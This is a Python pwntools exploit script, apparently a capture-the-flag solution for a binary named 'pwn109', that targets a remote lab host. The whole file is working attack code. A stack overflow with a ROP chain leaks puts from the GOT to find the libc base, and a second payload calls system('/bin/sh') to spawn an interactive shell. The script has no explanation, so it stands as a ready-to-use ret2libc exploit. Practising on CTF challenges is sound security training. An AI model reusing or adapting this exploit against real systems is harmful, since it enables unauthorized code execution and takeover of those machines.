from pwn import *
from pwn import p64

# ========================================================================

context.log_level = "ERROR"
# pros = process("../Tasks/pwn109.pwn109")
pros = remote("10.10.94.200",9009)

elf = ELF("../Tasks/pwn109.pwn109")
rop = ROP("../Tasks/pwn109.pwn109")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# ========================================================================

puts_got = elf.got["puts"]
puts_plt = elf.symbols["puts"]
main_addr = elf.symbols["main"]
rdi_addr = rop.find_gadget(["pop rdi","ret"]).address

# ========================================================================

payload = b"A" * 0x28
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

pros.sendline(payload)

pros.recvlines(6)
puts_addr = u64(pros.recvline().strip().ljust(8,b"\x00"))
print(hex(puts_addr))

libc_base_address = puts_addr - libc_elf.symbols["puts"]
print(hex(libc_base_address))

# ========================================================================

ret_addr = rop.find_gadget(["ret"]).address
exit_addr = libc_base_address + libc_elf.symbols["exit"]
system_addr = libc_base_address + libc_elf.symbols["system"]
sh_addr = libc_base_address + next(libc_elf.search(b"/bin/sh"))

payload = b"A" * 0x28
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(system_addr)
payload += p64(exit_addr)


pros.sendline(payload)

# ========================================================================

pros.interactive()
